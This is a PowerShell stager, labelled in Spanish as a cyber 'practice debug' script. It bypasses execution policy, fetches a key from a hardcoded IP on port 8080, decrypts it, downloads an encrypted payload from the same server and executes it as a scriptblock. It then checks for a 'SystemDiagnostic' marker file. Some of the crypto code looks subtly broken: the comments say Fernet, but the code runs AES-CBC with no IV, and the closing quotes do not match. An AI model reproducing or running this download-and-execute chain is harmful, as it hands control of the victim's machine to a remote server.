@powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
Write-Host '============================================' -ForegroundColor Green
Write-Host '  CYBER PRÁCTICA DEBUG - NATIVO WINDOWS' -ForegroundColor Green
Write-Host '============================================' -ForegroundColor Green
Write-Host ('PC: ' + $env:COMPUTERNAME + ' | ' + $env:USERNAME + ' | ' + (Get-Date)) -ForegroundColor Cyan

# 1. TIMESTAMP UNIX EXACTO
$ts = [math]::Round((Get-Date).ToUniversalTime().Subtract((New-Object DateTime 1970,1,1)).TotalSeconds)
Write-Host ('[1/6] TS: ' + $ts) -ForegroundColor Yellow

# 2. SALT FIJO
$salt = 'CyberDefense2024_FixedSalt_32charsExactly!!'
Write-Host ('[2/6] Salt: ' + $salt.Substring(0,12) + '...') -ForegroundColor Yellow

# 3. AUTH KEY
try {
    $authUrl = 'http://82.29.153.101:8080/auth/key?ts=' + $ts
    Write-Host ('[3/6] GET: ' + $authUrl) -ForegroundColor Cyan
    $authResp = Invoke-WebRequest -Uri $authUrl -UseBasicParsing -TimeoutSec 10
    Write-Host ('✓ Auth OK (' + $authResp.Content.Length + ' bytes)') -ForegroundColor Green
    
    # 4. CALCULAR CLAVE TEMPORAL
    $tempRaw = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(($salt + $ts)))
    $tempKey = [Convert]::ToBase64String($tempRaw[0..31])
    
    # 5. FERNET DESENCRIPTAR (NATIVO)
    $authBytes = [Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($authResp.Content)))
    $tempCipher = New-Object -TypeName 'System.Security.Cryptography.AesManaged'
    $tempCipher.Key = $tempRaw[0..31]
    $tempCipher.Mode = 'CBC'
    $payloadKeyBytes = $tempCipher.CreateDecryptor().TransformFinalBlock($authBytes, 0, $authBytes.Length)
    $payloadKey = [Text.Encoding]::UTF8.GetString($payloadKeyBytes)[0..43] -join ''
    
    Write-Host ('[4/6] Key: ' + $payloadKey.Substring(0,12) + '...') -ForegroundColor Green
    
    # 6. DOWNLOAD PAYLOAD
    $headers = @{ 'X-Decrypt-Key' = $payloadKey }
    Write-Host '[5/6] 📥 Payload...' -ForegroundColor Cyan
    $payloadResp = Invoke-WebRequest -Uri 'http://82.29.153.101:8080/payload/encrypted' -Headers $headers -UseBasicParsing -TimeoutSec 15
    
    Write-Host ('✓ Payload OK (' + $payloadResp.Content.Length + ' bytes)') -ForegroundColor Green
    
    # 7. EJECUTAR PAYLOAD
    Write-Host '[6/6] ▶️ Ejecutando...' -ForegroundColor Magenta
    $execPayload = [scriptblock]::Create($payloadResp.Content)
    & $execPayload
    
    # 8. VERIFICAR
    Start-Sleep 3
    $marker = "$env:PUBLIC\Desktop\SystemDiagnostic.log"
    if (Test-Path $marker) {
        Write-Host "`n✓ ✓ ✓ ÉXITO CONFIRMADO ✓ ✓ ✓" -ForegroundColor Green
        Get-Content $marker
    } else {
        Write-Host "`n⚠️ Sin marker (normal en algunos casos)" -ForegroundColor Yellow
    }
    
} catch {
    Write-Host "`n❌ ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host 'Posibles causas:' -ForegroundColor Red
    Write-Host '1. VPS offline (82.29.153.101:8080)' -ForegroundColor Red
    Write-Host '2. Timestamp expiró (10min)' -ForegroundColor Red
    Write-Host '3. artefacto.ps1 no existe en servidor' -ForegroundColor Red
}

Write-Host "`n================================================" -ForegroundColor Green
Write-Host '🏁 PRÁCTICA COMPLETADA - Revise Desktop/TEMP' -ForegroundColor Green
Write-Host '================================================" -ForegroundColor Green
Read-Host 'Presione ENTER para salir'
}"